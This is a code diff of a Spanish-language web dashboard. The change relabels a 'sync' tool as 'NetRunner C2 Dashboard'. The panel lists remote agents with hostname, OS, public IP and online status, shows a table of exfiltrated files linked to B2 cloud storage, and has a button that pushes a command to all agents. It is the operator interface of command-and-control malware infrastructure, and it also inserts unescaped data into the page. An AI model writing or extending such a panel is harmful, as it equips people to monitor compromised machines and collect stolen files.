@@ -1,98 +1,152 @@
-<!-- dashboard.html -->
 <!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dashboard - NetRunner Sync</title>
+    <title>NetRunner - Centro de Mando</title>
     <style>
-        body { font-family: sans-serif; background: #0a0a0a; color: #eee; margin: 2rem; }
-        h1, h2 { color: #3b82f6; }
-        table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
-        th, td { padding: 0.75rem; border: 1px solid #333; text-align: left; }
-        th { background: #1a1a1a; }
-        button { background: #3b82f6; color: white; border: none; padding: 0.5rem 1rem; border-radius: 4px; cursor: pointer; }
+        :root {
+            --bg: #0d1117;
+            --card: #161b22;
+            --text: #c9d1d9;
+            --accent: #58a6ff;
+            --online: #238636;
+            --offline: #8b949e;
+        }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: var(--bg); color: var(--text); margin: 2rem; }
+        h1, h2 { color: var(--accent); border-bottom: 1px solid #30363d; padding-bottom: 0.5rem; }
+        
+        .stats-container { display: flex; gap: 1rem; margin-bottom: 2rem; }
+        .stat-card { background: var(--card); padding: 1rem; border-radius: 6px; border: 1px solid #30363d; flex: 1; text-align: center; }
+        
+        table { width: 100%; border-collapse: collapse; margin-top: 1rem; background: var(--card); border-radius: 8px; overflow: hidden; }
+        th, td { padding: 0.85rem; border: 1px solid #30363d; text-align: left; }
+        th { background: #21262d; color: var(--accent); font-size: 0.9rem; text-transform: uppercase; }
+        tr:hover { background: #1c2128; }
+
+        .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
+        .badge { padding: 2px 8px; border-radius: 12px; font-size: 0.75rem; font-weight: bold; }
+        .badge-linux { background: #322d00; color: #f9f06b; border: 1px solid #f9f06b; }
+        .badge-win { background: #002d50; color: #60cdff; border: 1px solid #60cdff; }
+        
+        button { background: var(--accent); color: white; border: none; padding: 0.6rem 1.2rem; border-radius: 6px; cursor: pointer; font-weight: bold; transition: opacity 0.2s; }
+        button:hover { opacity: 0.8; }
+        
+        .agent-id { font-family: monospace; font-size: 0.75rem; color: #8b949e; }
+        .hostname { font-weight: bold; color: #58a6ff; display: block; }
     </style>
 </head>
 <body>
-    <h1>Dashboard de Sincronización</h1>
+    <h1>🛰️ NetRunner C2 Dashboard</h1>
     
-    <button id="force-sync-btn">Forzar Sincronización Global</button>
+    <div class="stats-container">
+        <div class="stat-card">
+            <small>Agentes Totales</small>
+            <h3 id="total-agents">0</h3>
+        </div>
+        <button id="force-sync-btn">🔄 Forzar Sincronización Global</button>
+    </div>
     
-    <h2>Agentes Conectados</h2>
+    <h2>💻 Agentes en la Red</h2>
     <table id="agents-table">
         <thead>
             <tr>
-                <th>ID</th>
-                <th>IP</th>
-                <th>Último Heartbeat</th>
+                <th>Estado</th>
+                <th>Hostname / ID</th>
+                <th>Sistema</th>
+                <th>IP Pública</th>
+                <th>Último Reporte</th>
             </tr>
         </thead>
         <tbody></tbody>
     </table>
     
-    <h2>Archivos Recibidos</h2>
+    <h2>📂 Exfiltración de Archivos</h2>
     <table id="files-table">
         <thead>
             <tr>
                 <th>Nombre</th>
                 <th>Tamaño</th>
                 <th>Estado</th>
-                <th>Fecha de Subida</th>
-                <th>Ruta Cloud</th>
+                <th>Fecha</th>
+                <th>Enlace Cloud</th>
             </tr>
         </thead>
         <tbody></tbody>
     </table>
 
     <script>
-        const forceSyncBtn = document.getElementById('force-sync-btn');
         const agentsTable = document.getElementById('agents-table').getElementsByTagName('tbody')[0];
         const filesTable = document.getElementById('files-table').getElementsByTagName('tbody')[0];
+        const totalAgentsLabel = document.getElementById('total-agents');
 
         async function fetchData() {
             try {
                 const res = await fetch('/api/dashboard-data');
                 const data = await res.json();
                 
-                // Agents
+                // Actualizar Agentes
                 agentsTable.innerHTML = '';
+                totalAgentsLabel.innerText = data.agents.length;
+                
                 data.agents.forEach(agent => {
                     const row = agentsTable.insertRow();
-                    row.innerHTML = `<td>${agent.id}</td><td>${agent.ip}</td><td>${new Date(agent.lastSeen).toLocaleString()}</td>`;
+                    
+                    // Lógica de Estado
+                    const statusColor = agent.isOnline ? '#238636' : '#8b949e';
+                    const statusText = agent.isOnline ? 'ONLINE' : 'OFFLINE';
+                    
+                    // Lógica de Sistema Operativo
+                    const isLinux = agent.os && agent.os.toLowerCase().includes('linux');
+                    const osBadge = isLinux ? 
+                        '<span class="badge badge-linux">🐧 LINUX</span>' : 
+                        '<span class="badge badge-win">🪟 WINDOWS</span>';
+                    
+                    row.innerHTML = `
+                        <td style="color: ${statusColor}; font-weight: bold; font-size: 0.8rem;">
+                            <span class="status-dot" style="background-color: ${statusColor}"></span>${statusText}
+                        </td>
+                        <td>
+                            <span class="hostname">${agent.hostname || 'Desconocido'}</span>
+                            <span class="agent-id">${agent.id}</span>
+                        </td>
+                        <td>${osBadge}</td>
+                        <td style="font-family: monospace;">${agent.ip || '---.---.---.---'}</td>
+                        <td style="font-size: 0.85rem;">${new Date(agent.lastSeen).toLocaleString()}</td>
+                    `;
                 });
 
-                // Files
+                // Actualizar Archivos
                 filesTable.innerHTML = '';
                 data.files.forEach(file => {
                     const row = filesTable.insertRow();
                     const statusColors = {
                         'processing': '#f59e0b',
                         'persisted': '#10b981',
-                        'local_only': '#6b7280',
                         'error': '#ef4444'
                     };
                     const status = file.status || 'processing';
-                    const color = statusColors[status] || '#6b7280';
+                    
                     row.innerHTML = `
-                        <td>${file.filename}</td>
+                        <td><strong>${file.filename}</strong></td>
                         <td>${(file.size / 1024).toFixed(2)} KB</td>
-                        <td style="color: ${color}; font-weight: bold;">${status.toUpperCase()}</td>
-                        <td>${new Date(file.timestamp).toLocaleString()}</td>
-                        <td>${file.cloudPath || '-'}</td>
+                        <td style="color: ${statusColors[status] || '#6b7280'}; font-weight: bold; font-size: 0.75rem;">${status.toUpperCase()}</td>
+                        <td style="font-size: 0.85rem;">${new Date(file.timestamp).toLocaleString()}</td>
+                        <td>${file.cloudPath ? `<a href="${file.cloudPath}" target="_blank" style="color: #58a6ff;">Ver en B2</a>` : '-'}</td>
                     `;
                 });
 
             } catch (e) {
-                console.error("Error fetching data:", e);
+                console.error("Error cargando Dashboard:", e);
             }
         }
         
-        forceSyncBtn.addEventListener('click', async () => {
+        document.getElementById('force-sync-btn').addEventListener('click', async () => {
             await fetch('/api/force-sync', { method: 'POST' });
-            alert('Comando de sincronización enviado.');
+            alert('Comando de sincronización enviado a todos los agentes.');
         });
 
+        // Refresco automático cada 5 segundos
         setInterval(fetchData, 5000);
         fetchData();
     </script>
